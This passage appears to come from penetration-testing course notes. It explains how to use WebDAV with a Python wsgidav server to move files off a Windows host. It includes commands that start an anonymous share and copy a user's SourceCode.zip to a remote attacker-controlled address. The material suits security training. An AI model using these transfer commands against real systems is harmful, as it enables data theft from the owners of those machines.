An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

#### Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav). After installing them, we run the `wsgidav` application in the target directory.

```shell-session
sudo pip3 install wsgidav cheroot
```

#### Using the WebDav Python module

```shell-session
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

#### Connecting to the Webdav Share

```cmd-session
dir \\192.168.49.128\DavWWWRoot
```


> [!NOTE]
> `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
> 
> You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

#### Uploading Files using SMB 

```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```